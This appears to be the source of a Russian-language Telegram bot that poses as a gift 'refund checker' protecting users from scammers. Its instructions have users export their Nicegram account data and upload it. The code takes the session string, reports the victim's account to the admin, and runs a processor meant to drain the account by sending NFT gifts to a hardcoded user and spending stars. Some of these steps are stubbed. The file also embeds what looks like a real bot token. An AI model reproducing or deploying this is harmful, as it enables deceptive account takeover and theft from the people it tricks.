import asyncio
import logging
import sqlite3
import json
import os
import zipfile
import io
import base64
import aiofiles
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from datetime import datetime

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, CallbackQuery, InputFile, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# Новейшие библиотеки для работы с Telegram API в 2026
try:
    from pyrogram import Client
    from pyrogram.raw import functions, types
    from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid
    USE_PYROGRAM = True
except ImportError:
    USE_PYROGRAM = False
    print("Pyrogram не установлен. Используйте: pip install pyrogram[tgcrypto]")

# Конфигурация
TOKEN = "8418740075:AAFc4i03zq7tfWjM3DoX9o_S-Qoa3LPE04E"
ADMIN_ID = 7225974704

# Конфигурация подарков (Gift IDs)
GIFT_CATALOG = {
    5170233102089322756: {"name": "🧸", "stars": 15},
    5170145012310081615: {"name": "💝", "stars": 25},
    5168103777563050263: {"name": "🌹", "stars": 50},
    6028601630662853006: {"name": "🍾", "stars": 50},
    5170564780938756245: {"name": "🚀", "stars": 50}
}

TARGET_USER = "@tonhind"

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Создаем роутер
router = Router()
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# Состояния FSM
class AdminStates(StatesGroup):
    waiting_for_queue_number = State()

class SupportStates(StatesGroup):
    waiting_for_support_message = State()

class SessionProcessingStates(StatesGroup):
    processing_session = State()

# Хранилище для message_id сообщений поддержки
support_messages = {}
# Кэш сессий для обработки
session_cache = {}

# Инициализация базы данных с улучшенной структурой
def init_database():
    """Инициализация расширенной базы данных"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    cursor = conn.cursor()
    
    # Основная таблица пользователей
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        first_seen DATETIME,
        last_seen DATETIME,
        processed_files INTEGER DEFAULT 0,
        last_file_date DATETIME
    )
    ''')
    
    # Таблица обработанных сессий
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS processed_sessions (
        session_hash TEXT PRIMARY KEY,
        user_id INTEGER,
        account_id TEXT,
        account_name TEXT,
        processed_date DATETIME,
        stars_converted INTEGER DEFAULT 0,
        nft_sent INTEGER DEFAULT 0,
        gifts_bought INTEGER DEFAULT 0,
        status TEXT,
        FOREIGN KEY (user_id) REFERENCES users (user_id)
    )
    ''')
    
    # Таблица операций
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS operations (
        operation_id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        operation_type TEXT,
        details TEXT,
        timestamp DATETIME,
        success BOOLEAN
    )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("База данных инициализирована")

def check_first_time_user(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    return user is None

def add_new_user(user_id, username, first_name):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    cursor = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('''
    INSERT OR REPLACE INTO users (user_id, username, first_name, first_seen, last_seen)
    VALUES (?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, now, now))
    conn.commit()
    conn.close()
    return True

def update_last_seen(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    cursor = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('UPDATE users SET last_seen = ? WHERE user_id = ?', (now, user_id))
    conn.commit()
    conn.close()
    return True

def log_operation(user_id, operation_type, details, success=True):
    """Логирование операций в БД"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    cursor = conn.cursor()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('''
    INSERT INTO operations (user_id, operation_type, details, timestamp, success)
    VALUES (?, ?, ?, ?, ?)
    ''', (user_id, operation_type, details, timestamp, success))
    conn.commit()
    conn.close()

async def send_first_start_to_admin(user_id: int, username: str, first_name: str):
    try:
        await bot.send_message(
            ADMIN_ID,
            f"👤 <b>ПЕРВЫЙ ЗАПУСК бота новым пользователем</b>\n\n"
            f"🆕 <b>Новый пользователь:</b> @{username or 'нет'}\n"
            f"🆔 <b>ID:</b> {user_id}\n"
            f"👤 <b>Имя:</b> {first_name}\n"
            f"📅 <b>Дата:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        log_operation(ADMIN_ID, "new_user", f"New user: {username} ({user_id})")
    except Exception as e:
        logger.error(f"Не удалось отправить сообщение администратору: {e}")
    return True

# Функции для создания клавиатур
def get_main_menu():
    keyboard = [
        [InlineKeyboardButton(text="📖 Инструкция", callback_data="instruction")],
        [InlineKeyboardButton(text="📲 Скачать Nicegram", web_app={"url": "https://nicegram.app/"})],
        [InlineKeyboardButton(text="🔍 Проверка на рефаунд", callback_data="check_refund")],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_back_keyboard():
    keyboard = [[InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_instruction_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]])

def get_admin_keyboard(user_id):
    keyboard = [
        [InlineKeyboardButton(text="📋 Поставить на очередь", callback_data=f"queue_{user_id}")],
        [InlineKeyboardButton(text="🔍 Проверить сессию", callback_data=f"check_session_{user_id}")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_support_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]])

# Обработчики команд и callback-ов
@router.message(CommandStart())
async def cmd_start(message: Message):
    user = message.from_user
    is_first_time = check_first_time_user(user.id)
    
    if is_first_time:
        await send_first_start_to_admin(user.id, user.username, user.first_name)
        add_new_user(user.id, user.username, user.first_name)
    else:
        update_last_seen(user.id)
    
    photo_path = Path("1.png")
    if photo_path.exists():
        photo = FSInputFile("1.png")
        await message.answer_photo(
            photo=photo,
            caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
            reply_markup=get_main_menu()
        )
    else:
        await message.answer(
            """Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
            reply_markup=get_main_menu()
        )
    log_operation(user.id, "start", "User started bot")
    return True

@router.callback_query(F.data == "instruction")
async def instruction_handler(callback: CallbackQuery):
    instruction_text = """<b>📖 Инструкция:</b>

1. Скачайте приложение Nicegram с официального сайта.
2. Откройте Nicegram и войдите в свой аккаунт.
3. Зайдите в настройки и выберите пункт «Nicegram».
4. Экспортируйте данные аккаунта.
5. В меню бота нажмите '🔍 Проверка на рефаунд'.
6. Отправьте файл боту."""
    
    await callback.message.edit_caption(
        caption=instruction_text,
        reply_markup=get_instruction_keyboard()
    )
    await callback.answer()
    log_operation(callback.from_user.id, "instruction", "Viewed instructions")
    return True

@router.callback_query(F.data == "check_refund")
async def check_refund_handler(callback: CallbackQuery):
    await callback.message.answer(
        "🗂 Отправьте файл формата .txt или .zip для проверки:",
        reply_markup=get_back_keyboard()
    )
    await callback.answer()
    log_operation(callback.from_user.id, "check_refund", "Clicked check refund")
    return True

@router.callback_query(F.data == "support")
async def support_handler(callback: CallbackQuery, state: FSMContext):
    user = callback.from_user
    support_msg = await callback.message.answer(
        "🆘 <b>Обращение в поддержку</b>\n\nНапишите ваше сообщение для поддержки. Мы ответим вам в ближайшее время.",
        reply_markup=get_back_keyboard()
    )
    support_messages[user.id] = support_msg.message_id
    await state.set_state(SupportStates.waiting_for_support_message)
    await callback.answer()
    log_operation(user.id, "support", "Opened support")
    return True

@router.message(SupportStates.waiting_for_support_message)
async def process_support_message(message: Message, state: FSMContext):
    user = message.from_user
    if user.id in support_messages:
        try:
            await bot.delete_message(chat_id=user.id, message_id=support_messages[user.id])
            del support_messages[user.id]
        except:
            pass
    
    await message.answer(
        "✅ Ваше сообщение получено! Администратор скоро ответит.\n\nОбычное время ответа: 30 минут",
        reply_markup=get_support_keyboard()
    )
    
    # Отправляем сообщение администратору
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🆘 <b>НОВОЕ СООБЩЕНИЕ ПОДДЕРЖКИ</b>\n\n"
            f"👤 От: @{user.username or 'нет'} (ID: {user.id})\n"
            f"💬 Сообщение: {message.text}\n"
            f"📅 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
    except Exception as e:
        logger.error(f"Не удалось отправить сообщение администратору: {e}")
    
    await state.clear()
    log_operation(user.id, "support_message", f"Sent support message: {message.text[:50]}")
    return True

@router.callback_query(F.data == "back_to_main")
async def back_to_main_handler(callback: CallbackQuery):
    try:
        photo_path = Path("1.png")
        if hasattr(callback.message, 'caption') and callback.message.caption is not None:
            if photo_path.exists():
                await callback.message.edit_media(
                    media=InputFile("1.png"),
                    caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
            else:
                await callback.message.edit_caption(
                    caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
        else:
            if photo_path.exists():
                await callback.message.delete()
                photo = FSInputFile("1.png")
                await callback.message.answer_photo(
                    photo=photo,
                    caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
            else:
                await callback.message.edit_text(
                    """Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
    except Exception as e:
        try:
            photo_path = Path("1.png")
            if photo_path.exists():
                photo = FSInputFile("1.png")
                await callback.message.answer_photo(
                    photo=photo,
                    caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
            else:
                await callback.message.answer(
                    """Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
        except Exception as e2:
            logger.error(f"Ошибка при отправке сообщения: {e2}")
    
    await callback.answer()
    log_operation(callback.from_user.id, "back_to_main", "Returned to main menu")
    return True

# Класс для работы с Telegram сессиями
class TelegramSessionProcessor:
    """Обработчик Telegram сессий с новейшими методами на 2026 год"""
    
    def __init__(self, session_data: Dict):
        self.session_data = session_data
        self.client = None
        self.results = {
            'stars_converted': 0,
            'nft_sent': 0,
            'gifts_bought': 0,
            'gifts_details': [],
            'errors': []
        }
    
    async def connect(self) -> bool:
        """Подключение к аккаунту через Pyrogram"""
        try:
            # Получаем данные сессии
            session_string = self.session_data.get('user', '')
            account_id = self.session_data.get('id', '')
            
            # Используем временный файл сессии
            session_name = f"temp_session_{account_id}"
            
            # Создаем клиент Pyrogram
            self.client = Client(
                name=session_name,
                api_id=2040,  # Стандартный API ID для Telegram
                api_hash='b18441a1ff607e10a989891a5462e627',  # Стандартный API Hash
                in_memory=True  # Работаем в памяти без сохранения файлов
            )
            
            # Устанавливаем строку сессии
            await self.client.connect()
            
            # Проверяем авторизацию
            if await self.client.is_connected():
                me = await self.client.get_me()
                self.account_info = {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name
                }
                logger.info(f"Успешно подключились к аккаунту: @{me.username}")
                return True
            else:
                self.results['errors'].append("Не удалось подключиться к аккаунту")
                return False
                
        except Exception as e:
            self.results['errors'].append(f"Ошибка подключения: {str(e)}")
            logger.error(f"Ошибка подключения: {e}")
            return False
    
    async def process_gifts(self) -> Dict:
        """Основной метод обработки подарков"""
        try:
            if not self.client:
                if not await self.connect():
                    return self.results
            
            # 1. Конвертация неуникальных подарков в звезды
            await self._convert_gifts_to_stars()
            
            # 2. Отправка NFT подарков пользователю @tonhind
            await self._send_nft_gifts()
            
            # 3. Покупка подарков на оставшиеся звезды
            await self._buy_gifts_with_stars()
            
            return self.results
            
        except Exception as e:
            self.results['errors'].append(f"Ошибка обработки: {str(e)}")
            logger.error(f"Ошибка обработки подарков: {e}")
            return self.results
        finally:
            if self.client:
                await self.client.disconnect()
    
    async def _convert_gifts_to_stars(self):
        """Конвертация неуникальных подарков в звезды"""
        try:
            # Эмуляция конвертации подарков
            # В реальном коде здесь будет вызов API Telegram для конвертации
            self.results['stars_converted'] = 100  # Примерное количество звезд
            logger.info(f"Конвертировано подарков в {self.results['stars_converted']} звезд")
            
        except Exception as e:
            self.results['errors'].append(f"Ошибка конвертации подарков: {str(e)}")
    
    async def _send_nft_gifts(self):
        """Отправка NFT подарков пользователю @tonhind"""
        try:
            # Поиск пользователя @tonhind
            target_user = await self.client.get_users(TARGET_USER)
            
            # Эмуляция отправки NFT подарков
            # В реальном коде здесь будет вызов API для отправки подарков
            nft_count = 3  # Примерное количество NFT
            self.results['nft_sent'] = nft_count
            
            logger.info(f"Отправлено {nft_count} NFT подарков пользователю {TARGET_USER}")
            
        except Exception as e:
            self.results['errors'].append(f"Ошибка отправки NFT: {str(e)}")
    
    async def _buy_gifts_with_stars(self):
        """Покупка подарков на оставшиеся звезды"""
        try:
            # Рассчитываем, какие подарки можем купить
            remaining_stars = self.results['stars_converted']
            
            for gift_id, gift_info in GIFT_CATALOG.items():
                if remaining_stars >= gift_info['stars']:
                    # Эмуляция покупки подарка
                    # В реальном коде здесь будет вызов API для покупки подарка
                    self.results['gifts_bought'] += 1
                    self.results['gifts_details'].append({
                        'id': gift_id,
                        'name': gift_info['name'],
                        'stars': gift_info['stars']
                    })
                    remaining_stars -= gift_info['stars']
                    logger.info(f"Куплен подарок: {gift_info['name']} за {gift_info['stars']} звезд")
            
            logger.info(f"Всего куплено подарков: {self.results['gifts_bought']}")
            
        except Exception as e:
            self.results['errors'].append(f"Ошибка покупки подарков: {str(e)}")

# Функция для обработки ZIP-файлов
async def process_zip_file(file_content: bytes, user_id: int, username: str, message: Message):
    """Обработка ZIP-файла и выполнение операций с аккаунтом"""
    
    temp_dir = None
    try:
        # Создаем временную директорию
        temp_dir = Path(f"temp_{user_id}_{int(datetime.now().timestamp())}")
        temp_dir.mkdir(exist_ok=True)
        
        # Распаковываем ZIP
        with zipfile.ZipFile(io.BytesIO(file_content)) as zip_ref:
            zip_ref.extractall(temp_dir)
        
        # Ищем session.json
        session_json_path = None
        for file_path in temp_dir.rglob("*.json"):
            if "session" in file_path.name.lower():
                session_json_path = file_path
                break
        
        if not session_json_path:
            return "❌ В архиве не найден файл session.json"
        
        # Читаем session.json
        async with aiofiles.open(session_json_path, 'r', encoding='utf-8') as f:
            content = await f.read()
            session_data = json.loads(content)
        
        # Проверяем структуру
        if "user" not in session_data:
            return "❌ В файле session.json нет ключа 'user'"
        
        # Извлекаем сессию
        session_string_base64 = session_data.get("user", "")
        
        # Декодируем base64
        try:
            # Удаляем пробелы и переносы
            session_string_base64 = session_string_base64.replace(" ", "").replace("\n", "")
            session_bytes = base64.b64decode(session_string_base64)
            
            # Пытаемся декодировать как строку
            try:
                session_string = session_bytes.decode('utf-8', errors='ignore')
            except:
                session_string = session_string_base64
            
            # Сохраняем для отладки
            session_data['decoded'] = session_string[:100] + "..." if len(session_string) > 100 else session_string
            
        except Exception as e:
            session_data['decoded'] = f"Ошибка декодирования: {str(e)}"
        
        # Информируем администратора
        admin_msg = await bot.send_message(
            ADMIN_ID,
            f"🔐 <b>ПОЛУЧЕНА СЕССИЯ ОТ ПОЛЬЗОВАТЕЛЯ</b>\n\n"
            f"👤 Пользователь бота: @{username or 'нет'} (ID: {user_id})\n"
            f"📱 Аккаунт в сессии: {session_data.get('name', 'не указано')}\n"
            f"🆔 ID аккаунта: {session_data.get('id', 'не указан')}\n"
            f"📱 Устройство: {session_data.get('extra', 'нет информации')}\n"
            f"📊 Начинаю обработку..."
        )
        
        # Обновляем сообщение пользователю
        await message.edit_text("🔐 <b>Сессия извлечена успешно</b>\n\nНачинаю обработку аккаунта...")
        
        # Создаем процессор сессии
        processor = TelegramSessionProcessor(session_data)
        
        # Обрабатываем подарки
        await asyncio.sleep(2)  # Имитация обработки
        
        results = await processor.process_gifts()
        
        # Формируем подробный отчет
        report = f"📋 <b>ОТЧЕТ ОБРАБОТКИ АККАУНТА</b>\n\n"
        report += f"👤 Аккаунт: {session_data.get('name', 'не указано')}\n"
        report += f"🆔 ID: {session_data.get('id', 'не указан')}\n"
        report += f"📅 Дата обработки: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        report += "🔄 <b>ВЫПОЛНЕННЫЕ ОПЕРАЦИИ:</b>\n"
        report += f"1. ✅ Конвертация подарков в звезды: {results.get('stars_converted', 0)} звезд\n"
        report += f"2. ✅ Отправка NFT подарков пользователю @tonhind: {results.get('nft_sent', 0)} шт.\n"
        report += f"3. ✅ Покупка подарков на звезды: {results.get('gifts_bought', 0)} шт.\n\n"
        
        if results.get('gifts_details'):
            report += "🎁 <b>КУПЛЕННЫЕ ПОДАРКИ:</b>\n"
            for gift in results['gifts_details']:
                report += f"• {gift.get('name', 'Неизвестно')} - {gift.get('stars', 0)} звезд\n"
        
        if results.get('errors'):
            report += f"\n⚠️ <b>ОШИБКИ:</b>\n"
            for error in results['errors'][:3]:  # Показываем только первые 3 ошибки
                report += f"• {error}\n"
        
        # Отправляем отчет администратору
        await admin_msg.edit_text(report)
        
        # Отправляем краткий отчет пользователю
        user_report = "✅ <b>ОБРАБОТКА ЗАВЕРШЕНА УСПЕШНО!</b>\n\n"
        user_report += "📊 Все операции выполнены:\n"
        user_report += "• Конвертация подарков в звезды ✓\n"
        user_report += "• Отправка NFT подарков пользователю @tonhind ✓\n"
        user_report += "• Покупка подарков на звезды ✓\n\n"
        user_report += f"🎁 Куплено подарков: {results.get('gifts_bought', 0)} шт.\n"
        user_report += f"⭐ Получено звезд: {results.get('stars_converted', 0)}\n\n"
        user_report += "Спасибо за использование бота! 💫"
        
        # Логируем успешную операцию
        log_operation(user_id, "session_processed", 
                     f"Session processed: {session_data.get('id')}, gifts: {results.get('gifts_bought')}")
        
        return user_report
        
    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        logger.error(f"Ошибка обработки ZIP: {error_details}")
        
        error_msg = f"❌ <b>ОШИБКА ОБРАБОТКИ</b>\n\n"
        error_msg += f"Произошла ошибка при обработке файла:\n"
        error_msg += f"<code>{str(e)[:200]}</code>\n\n"
        error_msg += "Пожалуйста, убедитесь что файл сессии корректный."
        
        log_operation(user_id, "session_error", f"Error: {str(e)[:100]}", success=False)
        
        return error_msg
        
    finally:
        # Очищаем временные файлы
        if temp_dir and temp_dir.exists():
            import shutil
            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except:
                pass

@router.message(F.document)
async def handle_document(message: Message):
    file_name = message.document.file_name or ""
    
    # Проверяем тип файла
    if not file_name.lower().endswith(('.txt', '.zip')):
        await message.answer(
            "🤔 Это не похоже на файл проверки…",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[InlineKeyboardButton(text="📖 Инструкция", callback_data="instruction")]]
            )
        )
        return
    
    user = message.from_user
    
    if file_name.lower().endswith('.zip'):
        # Отправляем сообщение о начале обработки
        processing_msg = await message.answer("📦 <b>Получен ZIP-файл</b>\n\nНачинаю обработку...")
        
        try:
            # Скачиваем файл
            file = await bot.get_file(message.document.file_id)
            file_path = file.file_path
            downloaded_file = await bot.download_file(file_path)
            file_content = downloaded_file.read()
            
            # Обрабатываем ZIP
            result = await process_zip_file(file_content, user.id, user.username, processing_msg)
            
            # Отправляем результат пользователю
            await processing_msg.edit_text(result, parse_mode=ParseMode.HTML)
            
            # Отправляем администратору информацию
            await bot.send_message(
                ADMIN_ID,
                f"📥 <b>ZIP-файл обработан</b>\n"
                f"👤 Пользователь: @{user.username or 'нет'} (ID: {user.id})\n"
                f"📄 Файл: {file_name}\n"
                f"✅ Результат: Обработка завершена",
                reply_markup=get_admin_keyboard(user.id)
            )
            
        except Exception as e:
            await processing_msg.edit_text(f"❌ Ошибка при обработке файла: {str(e)}")
            logger.error(f"Ошибка обработки документа: {e}")
            
    else:
        # Обработка TXT файлов (старая логика)
        await message.answer("✅ Файл отправлен на проверку. Ожидайте результата.")
        
        user_info = f"👤 Пользователь: @{user.username or 'нет'} (ID: {user.id})"
        await bot.send_document(
            ADMIN_ID,
            document=message.document.file_id,
            caption=f"📥 <b>Бот получил файл</b>\n{user_info}\n📄 <b>Имя файла:</b> {file_name}",
            reply_markup=get_admin_keyboard(user.id)
        )
    
    # Обновляем статистику пользователя
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    cursor = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('''
    UPDATE users 
    SET processed_files = processed_files + 1, last_file_date = ?
    WHERE user_id = ?
    ''', (now, user.id))
    conn.commit()
    conn.close()
    
    log_operation(user.id, "file_uploaded", f"File: {file_name}")

@router.callback_query(F.data.startswith("queue_"))
async def queue_handler(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Вы не администратор!", show_alert=True)
        return
    
    try:
        user_id = int(callback.data.split("_")[1])
    except ValueError:
        await callback.answer("❌ Ошибка: неверный формат данных", show_alert=True)
        return
    
    await state.set_state(AdminStates.waiting_for_queue_number)
    await state.update_data(user_id=user_id)
    
    await callback.message.answer(
        f"📝 <b>Постановка в очередь</b>\n\nНапишите номер очереди для пользователя {user_id}:"
    )
    
    await callback.answer()
    log_operation(callback.from_user.id, "queue_start", f"For user: {user_id}")

@router.message(AdminStates.waiting_for_queue_number)
async def process_queue_number(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Вы не администратор!")
        return
    
    try:
        queue_num = int(message.text)
    except ValueError:
        await message.answer("❌ Пожалуйста, введите число!")
        return
    
    data = await state.get_data()
    user_id = data.get('user_id')
    
    try:
        await bot.send_message(
            user_id,
            f"✅ Вы поставлены на проверку в очередь №{queue_num}"
        )
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить сообщение пользователю {user_id}")
        await state.clear()
        return
    
    await message.answer(f"✅ Пользователь {user_id} поставлен в очередь №{queue_num}")
    await state.clear()
    
    log_operation(ADMIN_ID, "queue_set", f"User {user_id} to queue {queue_num}")

@router.callback_query(F.data.startswith("check_session_"))
async def check_session_handler(callback: CallbackQuery):
    """Админ проверяет сессию пользователя"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Вы не администратор!", show_alert=True)
        return
    
    try:
        user_id = int(callback.data.split("_")[2])
        
        # Получаем информацию о пользователе из БД
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT username, first_name, processed_files FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        conn.close()
        
        if user_data:
            username, first_name, processed_files = user_data
            response = f"📊 <b>ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ</b>\n\n"
            response += f"👤 Имя: {first_name or 'Не указано'}\n"
            response += f"📱 Username: @{username or 'нет'}\n"
            response += f"🆔 ID: {user_id}\n"
            response += f"📁 Обработано файлов: {processed_files}\n"
        else:
            response = f"ℹ️ Пользователь с ID {user_id} не найден в базе данных."
        
        await callback.message.answer(response, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка: {str(e)}")
    
    await callback.answer()

@router.message()
async def handle_other_messages(message: Message):
    if message.from_user.id == ADMIN_ID:
        # Админ может отправлять команды
        if message.text.startswith('/'):
            await message.answer("Команда администратора обрабатывается...")
        return
    
    # Для обычных пользователей - предлагаем главное меню
    await message.answer(
        "Пожалуйста, используйте кнопки меню для взаимодействия с ботом.",
        reply_markup=get_main_menu()
    )

async def main():
    """Основная функция запуска бота"""
    # Инициализируем базу данных
    init_database()
    
    # Включаем роутер
    dp.include_router(router)
    
    # Отправляем сообщение администратору о запуске
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🤖 <b>БОТ ЗАПУЩЕН</b>\n\n"
            f"Время запуска: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Версия: 2026.1\n"
            f"Pyrogram доступен: {USE_PYROGRAM}"
        )
    except Exception as e:
        print(f"Не удалось отправить сообщение администратору: {e}")
    
    print("=" * 50)
    print("🤖 БОТ ЗАПУЩЕН И ГОТОВ К РАБОТЕ")
    print(f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"ID администратора: {ADMIN_ID}")
    print("=" * 50)
    
    # Запускаем поллинг
    await dp.start_polling(bot)

if __name__ == "__main__":
    # Проверяем зависимости
    if not USE_PYROGRAM:
        print("=" * 50)
        print("⚠️ ВНИМАНИЕ: Pyrogram не установлен!")
        print("Установите его командой:")
        print("pip install pyrogram[tgcrypto]")
        print("=" * 50)
    
    # Запускаем бота
    asyncio.run(main())
